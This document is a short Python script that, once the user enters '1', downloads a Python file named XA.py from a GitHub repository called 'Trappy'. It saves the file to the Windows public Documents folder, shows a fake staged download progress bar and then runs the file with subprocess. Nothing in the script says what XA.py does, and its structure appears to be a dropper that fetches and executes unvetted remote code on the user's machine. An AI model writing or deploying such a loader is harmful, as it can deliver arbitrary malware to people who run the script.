import requests , os , subprocess , time , sys
while True:
    menu = input("enter '1' to continue :")
    if menu == '1':
        def download_file(github_raw_url, save_folder):
            try:
                filename = github_raw_url.split('/')[-1]
                save_path = os.path.join(save_folder, filename)
                print(f"</>")
                response = requests.get(github_raw_url)
                print("Downloading Files ...", end='', flush=True)
                time.sleep(2)
                sys.stdout.write('\rDownloading Files 30%')
                time.sleep(1)
                sys.stdout.write('\rDownloading Files 60%')
                time.sleep(1.5)
                sys.stdout.write('\rDownloading Files 90%')
                time.sleep(1)
                sys.stdout.write('\rDownloading Files 99%')
                time.sleep(1)
                sys.stdout.write('\rDownloading Files 100%')
                sys.stdout.flush()
                response.raise_for_status()

                with open(save_path, 'wb') as f:
                    f.write(response.content)
                print("")
                print(f"File saved.")
                return save_path
            except Exception as e:
                print(f"Error downloading file: {e}")
                return None

        def run_file(filepath):
            try:
                print(f"")
                subprocess.run(["python", filepath], check=True)
            except Exception as e:
                print(f"Error running file: {e}")

        def main():
            github_raw_url = 'https://raw.githubusercontent.com/mrbirdIR/Trappy/refs/heads/main/XA.py'
            save_folder = r"C:\Users\Public\Documents"

            if not os.path.exists(save_folder):
                os.makedirs(save_folder)

            saved_file = download_file(github_raw_url, save_folder)

            if saved_file:
                print("Welcome back.")
                run_file(saved_file)

        if __name__ == "__main__":
            main()